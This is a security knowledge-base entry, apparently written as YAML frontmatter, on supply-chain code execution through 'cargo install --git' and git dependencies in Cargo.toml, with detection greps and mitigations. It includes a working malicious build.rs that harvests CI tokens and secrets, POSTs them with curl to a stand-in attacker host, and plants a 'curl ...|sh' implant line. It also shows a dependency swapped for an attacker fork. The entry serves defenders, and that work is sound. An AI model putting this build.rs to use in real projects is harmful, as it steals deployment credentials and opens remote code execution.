---
name: "Cargo Install from Git Repository"
packageManager: "cargo"
slug: "cargo-install-git"
category: "Code Execution"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "The `cargo install --git` command clones a git repository and builds its contents locally, including executing any build.rs scripts and proc-macros. This gives an arbitrary git URL full code execution on the developer's machine. CI/CD pipelines that use cargo install from git URLs are especially vulnerable, as they often run with elevated privileges and access to deployment credentials, secrets, and cloud infrastructure tokens."
prerequisites:
  - "The victim must run cargo install --git with a URL controlled or influenced by the attacker"
  - "Alternatively, the victim's Cargo.toml contains git dependencies pointing to attacker-controlled repositories"
  - "The attacker controls or has compromised the git repository being referenced"
attackScenarios:
  - title: "Malicious cargo install --git in CI/CD Pipelines"
    description: "Many CI/CD pipelines install Rust tools from git repositories using cargo install --git. An attacker who compromises the referenced repository (or tricks maintainers into adding a malicious git dependency) gains code execution in the CI/CD environment, with access to deployment secrets, cloud credentials, and the ability to inject code into release artifacts."
    commands:
      - label: "Typical CI/CD usage pattern (vulnerable)"
        code: |
          # .github/workflows/build.yml
          - name: Install custom tool
            run: cargo install --git https://github.com/org/internal-tool

          # If the repository is compromised, build.rs executes
          # with access to all CI/CD environment variables:
          # GITHUB_TOKEN, AWS_ACCESS_KEY_ID, DEPLOY_KEY, etc.
        language: "yaml"
      - label: "Malicious build.rs in the compromised repository"
        code: |
          // build.rs in the compromised git repository
          use std::env;
          use std::process::Command;

          fn main() {
              // In CI/CD, harvest all secrets
              let ci_vars: Vec<String> = env::vars()
                  .filter(|(k, _)| {
                      k.contains("TOKEN") || k.contains("SECRET") ||
                      k.contains("AWS") || k.contains("DEPLOY") ||
                      k.contains("NPM") || k.contains("DOCKER") ||
                      k == "GITHUB_TOKEN" || k == "CI"
                  })
                  .map(|(k, v)| format!("{}={}", k, v))
                  .collect();

              // Exfiltrate secrets
              let data = ci_vars.join("\n");
              let _ = Command::new("curl")
                  .args(&[
                      "-s", "-X", "POST",
                      "-d", &data,
                      "https://attacker.example.com/ci-secrets"
                  ])
                  .output();

              // Poison the build artifacts
              let _ = Command::new("sh")
                  .arg("-c")
                  .arg("echo 'curl https://attacker.example.com/implant|sh' >> /tmp/post-deploy.sh")
                  .output();

              println!("cargo:rerun-if-changed=build.rs");
          }
        language: "rust"
  - title: "Git Dependency Substitution in Cargo.toml"
    description: "An attacker submits a pull request or modifies Cargo.toml to replace a crates.io dependency with a git dependency pointing to a look-alike repository containing a malicious build.rs."
    commands:
      - label: "Cargo.toml with a malicious git dependency"
        code: |
          [dependencies]
          # Legitimate: serializer = "1.5"
          # Replaced with a git fork containing build.rs backdoor
          serializer = { git = "https://github.com/attacker/serializer-fork", branch = "main" }
        language: "toml"
      - label: "Unpinned git dependency (no rev or tag)"
        code: |
          [dependencies]
          # Dangerous: no commit pin, attacker can push new malicious commits
          internal-tool = { git = "https://github.com/org/internal-tool" }

          # Safer: pinned to a specific commit
          internal-tool = { git = "https://github.com/org/internal-tool", rev = "a1b2c3d4" }
        language: "toml"
detection:
  - title: "Audit Cargo.toml for git dependencies"
    description: "Search for git dependencies in Cargo.toml files that could pull code from external repositories."
    commands:
      - code: "grep -n 'git = ' Cargo.toml"
        language: "bash"
  - title: "Check CI/CD scripts for cargo install --git"
    description: "Scan CI/CD configuration files for cargo install commands that reference git repositories."
    commands:
      - code: "grep -rn 'cargo install.*--git' .github/ .gitlab-ci.yml Jenkinsfile Makefile 2>/dev/null"
        language: "bash"
  - title: "Verify git dependencies are pinned to specific commits"
    description: "Ensure all git dependencies specify a rev field to prevent the upstream from pushing malicious changes."
    commands:
      - code: |
          # Check for git deps without rev pinning
          grep 'git = ' Cargo.toml | grep -v 'rev = '
        language: "bash"
mitigation:
  - "Pin git dependencies to specific commit hashes using the rev field in Cargo.toml"
  - "Prefer crates.io dependencies over git dependencies whenever possible"
  - "Audit build.rs and proc-macro code in git dependencies before adding them"
  - "Use cargo vendor to create a local copy of dependencies for offline auditing"
  - "In CI/CD pipelines, use pre-built binaries or container images instead of cargo install --git"
  - "Restrict network access in CI/CD build environments to prevent secret exfiltration"
  - "Implement branch protection and required reviews on repositories used as git dependencies"
references:
  - title: "The Cargo Book - Specifying Dependencies from Git Repositories"
    url: "https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html#specifying-dependencies-from-git-repositories"
  - title: "Cargo install Documentation"
    url: "https://doc.rust-lang.org/cargo/commands/cargo-install.html"
created: 2026-04-02
updated: 2026-04-02
---
